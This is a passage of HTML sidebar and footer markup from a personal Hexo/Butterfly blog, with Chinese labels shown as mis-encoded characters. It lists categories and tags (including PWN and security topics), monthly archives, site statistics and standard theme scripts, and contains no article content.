href="/categories/PWN/%E8%B0%83%E8%AF%95/"><span class="card-category-list-name">è°ƒè¯•</span><span class="card-category-list-count">1</span></a></li></ul></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span class="card-category-list-name">æ¼æ´å¤ç°</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%94%9F%E6%B4%BB/"><span class="card-category-list-name">ç”Ÿæ´»</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%A7%91%E7%A0%94-%E5%B9%B6%E6%B2%A1%E6%9C%89/"><span class="card-category-list-name">ç§‘ç ”(å¹¶æ²¡æœ‰)</span><span class="card-category-list-count">1</span></a></li>
            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>æ ‡ç­¾</span></div><div class="card-tag-cloud"><a href="/tags/%E6%97%85%E6%B8%B8/" style="font-size: 1.15em; color: rgb(5, 96, 131)">æ—…æ¸¸</a><a href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/" style="font-size: 1.3em; color: rgb(101, 192, 72)">è·¯ç”±å™¨</a><a href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/" style="font-size: 1.15em; color: rgb(72, 165, 169)">æµè§ˆå™¨å®‰å…¨</a><a href="/tags/csapp/" style="font-size: 1.15em; color: rgb(49, 39, 173)">csapp</a><a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.3em; color: rgb(25, 46, 12)">Cè¯­è¨€</a><a href="/tags/PWN%E5%85%A5%E9%97%A8/" style="font-size: 1.45em; color: rgb(142, 132, 39)">PWNå…¥é—¨</a><a href="/tags/%E5%A0%86/" style="font-size: 1.15em; color: rgb(59, 145, 181)">å †</a><a href="/tags/docker/" style="font-size: 1.15em; color: rgb(16, 137, 107)">docker</a><a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size: 1.15em; color: rgb(32, 142, 164)">è„šæœ¬</a><a href="/tags/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B/" style="font-size: 1.38em; color: rgb(182, 162, 139)">ç ”ç©¶ç”Ÿè¯¾ç¨‹</a><a href="/tags/%E8%AF%97%E6%AD%8C/" style="font-size: 1.15em; color: rgb(165, 101, 160)">è¯—æ­Œ</a><a href="/tags/%E8%B0%83%E8%AF%95/" style="font-size: 1.15em; color: rgb(7, 131, 60)">è°ƒè¯•</a><a href="/tags/%E8%AE%BA%E6%96%87/" style="font-size: 1.15em; color: rgb(178, 163, 163)">è®ºæ–‡</a><a href="/tags/KVM/" style="font-size: 1.22em; color: rgb(84, 2, 109)">KVM</a><a href="/tags/USENIX/" style="font-size: 1.15em; color: rgb(129, 7, 20)">USENIX</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>å½’æ¡£</span><a class="card-more-btn" href="/archives/" title="æŸ¥çœ‹æ›´å¤š">
    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">ä¸€æœˆ 2024</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">åä¸€æœˆ 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">åæœˆ 2023</span><span class="card-archive-list-count">6</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">ä¹æœˆ 2023</span><span class="card-archive-list-count">7</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">å…«æœˆ 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">ä¸ƒæœˆ 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">å…­æœˆ 2023</span><span class="card-archive-list-count">8</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/05/"><span class="card-archive-list-date">äº”æœˆ 2023</span><span class="card-archive-list-count">7</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>ç½‘ç«™èµ„è®¯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">æ–‡ç« æ•°ç›® :</div><div class="item-count">82</div></div><div class="webinfo-item"><div class="item-name">å·²è¿è¡Œæ—¶é—´ :</div><div class="item-count" id="runtimeshow" data-publishDate="2022-10-02T16:00:00.000Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">æœ¬ç«™è®¿å®¢æ•° :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">æœ¬ç«™æ€»è®¿é—®é‡ :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">æœ€åæ›´æ–°æ—¶é—´ :</div><div class="item-count" id="last-push-date" data-lastPushDate="2024-01-28T14:42:45.853Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By å”ä»”æ©™</div><div class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">æœç´¢</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  æ•°æ®åº“åŠ è½½ä¸­</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« " type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function subtitleType () {
  if (true) { 
    window.typed = new Typed("#subtitle", {
      strings: ["åº”çŸ¥å­¦é—®éš¾ï¼Œåœ¨ä¹ç‚¹æ»´å‹¤ã€‚å°¤å…¶éš¾ä¸Šéš¾ï¼Œé”»ç‚¼å“å¾·çº¯ã€‚","å‹¤èƒ½è¡¥æ‹™,å¤©é“é…¬å‹¤"],
      startDelay: 300,
      typeSpeed: 150,
      loop: true,
      backSpeed: 50
    })
  } else {
    document.getElementById("subtitle").innerHTML = 'åº”çŸ¥å­¦é—®éš¾ï¼Œåœ¨ä¹ç‚¹æ»´å‹¤ã€‚å°¤å…¶éš¾ä¸Šéš¾ï¼Œé”»ç‚¼å“å¾·çº¯ã€‚'
  }
}

if (true) {
  if (typeof Typed === 'function') {
    subtitleType()
  } else {
    getScript('https://cdn.jsdelivr.net/npm/typed.js/lib/typed.min.js').then(subtitleType)
  }
} else {
  subtitleType()
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>